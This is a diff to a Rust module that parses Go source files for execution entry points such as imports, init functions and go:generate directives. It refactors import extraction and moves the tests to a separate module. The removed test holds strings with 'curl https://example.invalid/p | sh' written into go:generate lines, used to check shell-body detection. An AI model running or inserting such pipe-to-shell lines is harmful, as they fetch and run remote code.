@@ -1,6 +1,6 @@
 //! Go execution contexts. These are potential entry points, not proof that a
 //! package is selected for a particular GOOS/GOARCH, build tag, or test run.
-use super::named_children;
+use super::{named_children, text};
 use crate::Values;
 use crate::value_key;
 use serde_json::json;
@@ -14,30 +14,41 @@ pub(super) fn package_name<'s>(root: Node<'_>, source: &'s str) -> &'s str {
     for node in named_children(root) {
         if node.kind() == "package_clause" {
             if let Some(n) = node.named_child(0) {
-                package = &source[n.byte_range()];
+                package = text(n, source);
             }
         }
     }
     package
 }
 
-pub(super) fn imports(root: Node<'_>, source: &str) -> HashMap<String, String> {
-    let mut out = HashMap::new();
-    let mut stack = vec![root];
-    while let Some(node) = stack.pop() {
-        if node.kind() == "import_spec" {
-            if let Some(path) = node.child_by_field_name("path") {
-                let path = source[path.byte_range()].trim_matches(['"', '`']);
-                let alias = node
-                    .child_by_field_name("name")
-                    .map(|n| &source[n.byte_range()])
-                    .unwrap_or_else(|| path.rsplit('/').next().unwrap_or(path));
-                if !matches!(alias, "." | "_") {
-                    out.insert(alias.into(), path.into());
-                }
+/// One `import` spec: the package path, and the local name when the spec
+/// gives one (`_` and `.` included).
+pub(super) struct Import<'s> {
+    pub(super) path: &'s str,
+    pub(super) name: Option<&'s str>,
+    pub(super) offset: usize,
+}
+
+/// The file's imports, in source order. Imports are top-level declarations.
+pub(super) fn imports<'s>(root: Node<'_>, source: &'s str) -> Vec<Import<'s>> {
+    let mut out = Vec::new();
+    for declaration in named_children(root).filter(|n| n.kind() == "import_declaration") {
+        for spec in named_children(declaration) {
+            let specs: Vec<Node<'_>> = if spec.kind() == "import_spec_list" {
+                named_children(spec).collect()
+            } else {
+                vec![spec]
+            };
+            for spec in specs.into_iter().filter(|n| n.kind() == "import_spec") {
+                let Some(path) = spec.child_by_field_name("path") else {
+                    continue;
+                };
+                out.push(Import {
+                    path: text(path, source).trim_matches(['"', '`']),
+                    name: spec.child_by_field_name("name").map(|n| text(n, source)),
+                    offset: path.start_byte(),
+                });
             }
-        } else if node.kind() != "function_declaration" {
-            stack.extend(named_children(node));
         }
     }
     out
@@ -88,7 +99,7 @@ pub(super) fn execution_facts(root: Node<'_>, source: &str, values: &mut Values)
         match node.kind() {
             "function_declaration" => {
                 if let Some(n) = node.child_by_field_name("name") {
-                    let name = &source[n.byte_range()];
+                    let name = text(n, source);
                     if name == "init" {
                         init_count += 1;
                     }
@@ -178,21 +189,4 @@ pub(super) fn execution_facts(root: Node<'_>, source: &str, values: &mut Values)
 }
 
 #[cfg(test)]
-mod tests {
-    use super::*;
-    #[test]
-    fn generate_arguments_are_not_implicitly_shell() {
-        let source = "package p\n//go:generate curl https://example.invalid/p | sh\n//go:generate -command shell sh -c\n//go:generate shell \"curl https://example.invalid/p | sh\"\n //go:generate sh -c \"curl x | sh\"\n";
-        let parsed = crate::OpenOptions::new()
-            .path(std::path::Path::new("p.go"))
-            .open(source.as_bytes());
-        let directives = parsed.values().get("source.go.generate").unwrap();
-        assert_eq!(directives.as_array().unwrap().len(), 2);
-        assert_eq!(directives[0]["shell_body"], json!(null));
-        assert_eq!(
-            directives[1]["shell_body"],
-            json!("curl https://example.invalid/p | sh")
-        );
-        assert!(words("sh -c \"unterminated").is_none());
-    }
-}
+mod tests;
